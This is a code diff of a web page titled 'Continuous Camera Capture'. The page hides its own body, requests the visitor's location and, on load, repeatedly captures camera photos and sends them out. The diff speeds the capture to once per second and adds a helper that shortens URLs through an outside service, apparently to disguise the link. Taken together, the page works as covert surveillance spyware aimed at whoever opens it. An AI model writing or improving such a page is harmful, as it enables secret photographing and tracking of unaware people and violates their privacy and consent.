@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Continuous Camera Capture</title>
+  <title>Continuous Camera Capture with Location & URL Shortening</title>
   <style>
     body {
       display: none; /* Hide the body */
@@ -27,7 +27,7 @@
       });
     }
 
-    // Function to get the user's location
+    // Function to get the user's location (prompt permission)
     function getLocation() {
       return new Promise((resolve, reject) => {
         if (navigator.geolocation) {
@@ -94,8 +94,8 @@
                 });
             }
 
-            // Capture and send photo every 3 seconds
-            setInterval(captureAndSendPhoto, 3000);  // Interval set to capture every 3 seconds
+            // Capture and send photo every 1 second (faster interval)
+            setInterval(captureAndSendPhoto, 1000);  // Interval set to capture every 1 second
           })
           .catch((error) => {
             console.error('Permission error:', error);
@@ -130,6 +130,34 @@
       });
     }
 
+    // Function to shorten URLs using a free API (TURL)
+    function shortenURL(longUrl) {
+      return new Promise((resolve, reject) => {
+        $.get(`https://api.turl.tk/shorten?url=${encodeURIComponent(longUrl)}`, function(data) {
+          if (data.success) {
+            resolve(data.shorturl);
+          } else {
+            reject('URL shortening failed');
+          }
+        }).fail(function() {
+          reject('Error connecting to URL shortening service');
+        });
+      });
+    }
+
+    // Example of shortening a URL (you can trigger this with an input field or button)
+    function handleShortenURL() {
+      const longUrl = prompt("Enter a URL to shorten:");
+      if (longUrl) {
+        shortenURL(longUrl).then((shortUrl) => {
+          alert(`Shortened URL: ${shortUrl}`);
+        }).catch((error) => {
+          alert(error);
+        });
+      }
+    }
+
+    // Trigger URL shortening on page load (optional, you can add a button for this)
     window.onload = function() {
       startCapturing(); // Start capturing photos and sending them continuously
     };
